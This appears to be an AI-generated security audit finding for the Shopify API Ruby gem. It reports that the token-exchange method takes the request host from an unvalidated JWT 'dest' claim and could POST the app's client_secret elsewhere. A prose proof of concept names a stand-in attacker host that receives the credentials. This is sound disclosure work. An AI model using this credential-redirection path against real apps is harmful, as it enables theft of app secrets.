## Analysis Result

I found a concrete analog: `TokenExchange.exchange_token` in `lib/shopify_api/auth/token_exchange.rb` derives the destination host for the `client_secret`-bearing HTTP request from an **unvalidated** JWT `dest` claim, unlike every sibling method in the same file/module (`migrate_to_expiring_token`, `client_credentials`, `refresh_access_token`), which all call `Utils::ShopValidator.sanitize!` before constructing the request host.

### Title
Token Exchange sends `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the outgoing `/admin/oauth/access_token` request host directly from `jwt_payload.shop` (the JWT's `dest` claim), bypassing `Utils::ShopValidator.sanitize!` that every other OAuth-credential-request method (`client_credentials`, `refresh_access_token`, `migrate_to_expiring_token`) applies to their `shop` argument before use.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the raw `dest` claim string with no domain allow‑list check: [1](#0-0) . The signature on the JWT (`aud`==api_key, HS256 verified against `Context.api_secret_key`) proves the token was minted by an app holding the shared secret, but it does not constrain `dest` to a `*.myshopify.com`/trusted domain — that constraint is enforced only by the app's own use of `ShopValidator`, not by the JWT verification itself.

In `exchange_token`, this unvalidated `dest_shop` is used directly to build the session that determines the HTTP request host: [2](#0-1) 

That session is then passed into `Clients::HttpClient.new`, which sets `@base_uri = "https://#{api_host || session.shop}"` — i.e., the host the `client_id`/`client_secret` POST body is sent to: [3](#0-2) 

Compare with the other three OAuth-credential methods in the very same module/file, which all sanitize the shop before building the session/host: [4](#0-3) [5](#0-4) [6](#0-5) 

The broken identity binding, expressed as an equality that should hold but doesn't:
`host_that_receives(client_id, client_secret, code)` == `host_validated_by(ShopValidator.sanitize!)`

For `exchange_token`, the right-hand side is never computed — the host is taken from `dest_shop` unchecked.

### Impact Explanation
If a host application obtains a session token whose `dest` claim is attacker-influenced (e.g., a malicious/compromised embedded-app iframe context, a proxy, or any caller that forwards a session token from an untrusted source into `exchange_token` before the host application itself validates `dest`), this gem will POST the app's `client_id` and `client_secret` — the app's core credentials — to whatever host is encoded in `dest`. This is SSRF carrying the app's credentials (client_secret exfiltration to an attacker-controlled host), matching the "High" impact category (SSRF with the app's credentials / credential leakage).

### Likelihood Explanation
Likelihood depends on the host application's own validation of the token's origin before invoking `exchange_token`; Shopify's documented token-exchange flow assumes the session token itself is trustworthy input from the App Bridge/Shopify runtime. However, within the scope of this gem, `exchange_token` is the *only* OAuth-credential path in `token_exchange.rb`/the client_credentials/refresh_token family that omits `ShopValidator.sanitize!`, which is an inconsistency the gem itself should not rely on host-application diligence to cover, especially since the sibling methods explicitly demonstrate the intended validation pattern exists and is expected.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, validate `dest_shop` via `Utils::ShopValidator.sanitize!(dest_shop)` (or an equivalent trusted-domain check) before constructing `shop_session` and issuing the `HttpClient` request, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`.

### Proof of Concept
1. Attacker controls or influences the `dest` claim of a session token that reaches the host app's `exchange_token(session_token: token, requested_token_type: ...)` call (e.g., `dest: "https://attacker-controlled.example.com"`), with the token otherwise validly signed by `Context.api_secret_key` (any scenario where the JWT signature check passes but `dest` is not itself constrained/cross-checked by the host app).
2. `JwtPayload.new(token)` succeeds; `jwt_payload.shop` returns `"attacker-controlled.example.com"` unchanged: [1](#0-0) 
3. `exchange_token` builds `shop_session = Session.new(shop: dest_shop)` and issues `POST https://attacker-controlled.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret`: [7](#0-6) 
4. The attacker's server receives the app's `client_secret` in the POST body.
